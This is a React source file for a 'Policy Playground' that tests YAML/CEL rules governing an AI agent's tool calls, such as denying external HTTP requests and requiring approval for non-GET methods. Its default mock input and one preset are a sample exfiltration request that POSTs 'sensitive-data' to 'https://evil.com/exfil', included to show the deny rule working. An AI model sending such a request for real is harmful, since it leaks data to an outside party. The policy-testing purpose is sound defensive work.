import { useState } from 'react';
import './PolicyPlayground.css';

const DEFAULT_POLICY = `version: "1"
rules:
  - name: block-external-http
    match:
      tool: http_request
      condition: "!input.url.startsWith('https://internal.') && !input.url.startsWith('http://localhost')"
    action: deny
    message: "External API access blocked"

  - name: require-approval-mutations
    match:
      tool: http_request
      condition: "input.method != 'GET'"
    action: require_approval
    message: "Non-GET requests require approval"
`;

const DEFAULT_INPUT = {
  url: 'https://evil.com/exfil',
  method: 'POST',
  body: 'sensitive-data',
};

export default function PolicyPlayground() {
  const [policyYaml, setPolicyYaml] = useState(DEFAULT_POLICY);
  const [tool, setTool] = useState('http_request');
  const [inputJson, setInputJson] = useState(JSON.stringify(DEFAULT_INPUT, null, 2));
  const [environment, setEnvironment] = useState('production');
  const [riskScore, setRiskScore] = useState(0.5);
  const [result, setResult] = useState<{
    allow: boolean;
    deny: boolean;
    require_approval: boolean;
    message?: string;
    approvers?: string[];
  } | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleCheck = async () => {
    setError(null);
    setResult(null);
    setLoading(true);

    let input: Record<string, unknown>;
    try {
      input = JSON.parse(inputJson);
    } catch {
      setError('Invalid JSON in input');
      setLoading(false);
      return;
    }

    try {
      const res = await fetch('/v1/policy/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          policy_yaml: policyYaml,
          tool,
          input,
          environment,
          risk_score: riskScore,
        }),
      });

      const data = await res.json();
      if (!res.ok) {
        setError(data.error || data.message || res.statusText);
        setLoading(false);
        return;
      }
      setResult(data);
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Request failed');
    } finally {
      setLoading(false);
    }
  };

  const presetActions = [
    { tool: 'http_request', input: { url: 'https://evil.com/exfil', method: 'POST' }, label: 'External POST (expect deny)' },
    { tool: 'http_request', input: { url: 'http://localhost:8080/health', method: 'GET' }, label: 'Localhost GET (expect allow)' },
    { tool: 'http_request', input: { url: 'https://internal.api.com/data', method: 'POST' }, label: 'Internal POST (expect require_approval)' },
    { tool: 'echo', input: { message: 'hello' }, label: 'echo (expect allow)' },
  ];

  return (
    <div className="policy-playground">
      <h1>Policy Playground</h1>
      <p className="subtitle">Write CEL policy, run mock actions, see Allow / Deny / RequireApproval</p>

      <div className="playground-layout">
        <div className="panel">
          <h2>Policy (YAML)</h2>
          <textarea
            value={policyYaml}
            onChange={(e) => setPolicyYaml(e.target.value)}
            rows={18}
            spellCheck={false}
          />
        </div>

        <div className="panel">
          <h2>Mock Action</h2>
          <label>Tool</label>
          <input
            type="text"
            value={tool}
            onChange={(e) => setTool(e.target.value)}
            placeholder="e.g. http_request"
          />
          <label>Input (JSON)</label>
          <textarea
            value={inputJson}
            onChange={(e) => setInputJson(e.target.value)}
            rows={8}
            spellCheck={false}
          />
          <label>Environment</label>
          <input
            type="text"
            value={environment}
            onChange={(e) => setEnvironment(e.target.value)}
          />
          <label>Risk Score (0-1)</label>
          <input
            type="number"
            min={0}
            max={1}
            step={0.1}
            value={riskScore}
            onChange={(e) => setRiskScore(parseFloat(e.target.value) || 0)}
          />

          <div className="presets">
            <strong>Presets</strong>
            {presetActions.map((p, i) => (
              <button
                key={i}
                type="button"
                className="preset-btn"
                onClick={() => {
                  setTool(p.tool);
                  setInputJson(JSON.stringify(p.input, null, 2));
                }}
              >
                {p.label}
              </button>
            ))}
          </div>

          <button className="check-btn" onClick={handleCheck} disabled={loading}>
            {loading ? 'Checking...' : 'Run Check'}
          </button>
        </div>

        <div className="panel result-panel">
          <h2>Result</h2>
          {error && <div className="result-error">{error}</div>}
          {result && (
            <div className={`result ${result.deny ? 'deny' : result.require_approval ? 'approval' : 'allow'}`}>
              <div className="result-badge">
                {result.deny ? 'Deny' : result.require_approval ? 'Require Approval' : 'Allow'}
              </div>
              {result.message && <p className="result-message">{result.message}</p>}
              {result.approvers && result.approvers.length > 0 && (
                <p className="result-approvers">Approvers: {result.approvers.join(', ')}</p>
              )}
              <pre className="result-raw">{JSON.stringify(result, null, 2)}</pre>
            </div>
          )}
          {!result && !error && !loading && (
            <p className="placeholder">Click &quot;Run Check&quot; to evaluate the policy.</p>
          )}
        </div>
      </div>

    </div>
  );
}
